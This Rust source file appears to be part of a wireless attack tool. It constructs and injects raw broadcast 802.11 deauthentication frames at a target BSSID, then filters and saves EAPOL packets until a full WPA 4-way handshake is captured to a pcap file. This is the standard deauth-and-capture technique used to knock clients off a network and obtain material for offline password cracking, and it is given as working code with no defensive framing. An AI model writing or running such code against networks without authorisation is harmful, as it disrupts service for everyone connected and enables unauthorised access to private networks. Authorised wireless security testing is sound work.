use crate::error::AetherError;
use log::{debug, error, info};
use pcap::{Active, Capture};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

/// 1. Construct and inject a raw 802.11 Broadcast Deauthentication frame targeting a specific BSSID.
pub fn inject_broadcast_deauth(interface_name: &str, bssid: &[u8; 6]) -> Result<(), AetherError> {
    let mut cap = pcap::Capture::from_device(interface_name)
        .map_err(|e| AetherError::CaptureError(e.to_string()))?
        .promisc(true)
        .open()
        .map_err(|e| {
            AetherError::CaptureError(format!("Failed to open device for injection: {}", e))
        })?;

    // Minimal Radiotap Header (8 bytes)
    let radiotap_header: [u8; 8] = [
        0x00, // Version
        0x00, // Pad
        0x08, 0x00, // Header length (8 bytes, Little Endian)
        0x00, 0x00, 0x00, 0x00, // Present flags (0 - no additional fields)
    ];

    // 802.11 Management Frame: Deauthentication
    // Frame Control: 0xC0 0x00 (Type: 0=Mgmt, Subtype: 12=Deauth -> 0xC0)
    // Duration: 0x00 0x00
    // DA (Destination Address): FF:FF:FF:FF:FF:FF (Broadcast)
    // SA (Source Address): BSSID
    // BSSID: BSSID
    // Seq Ctrl: 0x00 0x00

    let mut frame = Vec::new();
    frame.extend_from_slice(&radiotap_header);

    // Frame Control
    frame.push(0xC0);
    frame.push(0x00);

    // Duration
    frame.extend_from_slice(&[0x00, 0x00]);

    // Destination (Broadcast)
    let broadcast_mac = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF];
    frame.extend_from_slice(&broadcast_mac);

    // Source
    frame.extend_from_slice(bssid);

    // BSSID
    frame.extend_from_slice(bssid);

    // Sequence Control
    frame.extend_from_slice(&[0x00, 0x00]);

    // Body - Reason Code: 7 (Class 3 frame received from nonassociated STA)
    // Little Endian: 0x07 0x00
    frame.extend_from_slice(&[0x07, 0x00]);

    cap.sendpacket(&*frame)
        .map_err(|e| AetherError::CaptureError(format!("Failed to inject Deauth frame: {}", e)))?;

    info!(
        "Injected Broadcast Deauthentication frame to BSSID: {:02X?}",
        bssid
    );

    Ok(())
}

/// 2. PCAP filter logic isolating ether proto 0x888e (EAPOL packets) for WPA handshakes.
pub fn apply_eapol_filter(cap: &mut Capture<Active>) -> Result<(), AetherError> {
    cap.filter("ether proto 0x888e", true).map_err(|e| {
        AetherError::CaptureError(format!("Failed to apply EAPOL BPF filter: {}", e))
    })?;

    Ok(())
}

/// 3. Function to capture and save these EAPOL packets to a `.pcap` file.
pub fn capture_and_save_eapol(
    interface_name: &str,
    output_pcap_path: &str,
    stop_flag: Arc<AtomicBool>,
) -> Result<(), AetherError> {
    let cap = pcap::Capture::from_device(interface_name)
        .map_err(|e| AetherError::CaptureError(e.to_string()))?
        .promisc(true)
        .snaplen(65535)
        .timeout(100)
        .open()
        .map_err(|e| {
            AetherError::CaptureError(format!("Failed to open device for EAPOL capture: {}", e))
        })?;

    let mut cap = cap.setnonblock().map_err(|e| {
        AetherError::CaptureError(format!("Failed to set non-blocking mode: {}", e))
    })?;

    apply_eapol_filter(&mut cap)?;

    let mut savefile = cap
        .savefile(output_pcap_path)
        .map_err(|e| AetherError::CaptureError(format!("Failed to create pcap savefile: {}", e)))?;

    info!("Saving EAPOL handshake packets to: {}", output_pcap_path);

    let mut eapol_count = 0;
    let start_time = std::time::Instant::now();
    let timeout_duration = std::time::Duration::from_secs(15);

    while !stop_flag.load(Ordering::Relaxed) {
        // Auto-timeout after 15 seconds
        if start_time.elapsed() > timeout_duration {
            info!("EAPOL capture timed out after 15 seconds.");
            break;
        }

        match cap.next_packet() {
            Ok(packet) => {
                eapol_count += 1;
                debug!(
                    "Captured EAPOL packet {}/4! Length: {}",
                    eapol_count,
                    packet.data.len()
                );
                savefile.write(&packet);

                // Auto-stop if we captured 4 packets (a full 4-way handshake)
                if eapol_count >= 4 {
                    info!(
                        "Successfully captured {} EAPOL packets! Auto-stopping.",
                        eapol_count
                    );
                    break;
                }
            }
            Err(pcap::Error::TimeoutExpired) | Err(pcap::Error::IoError(_)) => {
                std::thread::sleep(std::time::Duration::from_millis(50));
                continue;
            }
            Err(e) => {
                error!("Capture error: {}", e);
                break;
            }
        }
    }

    // Clean up empty files and return an error so the UI shows it failed
    if eapol_count == 0 {
        std::fs::remove_file(output_pcap_path).ok();
        return Err(AetherError::CaptureError(
            "Timeout: No handshake packets were captured within 15 seconds.".into(),
        ));
    }

    Ok(())
}
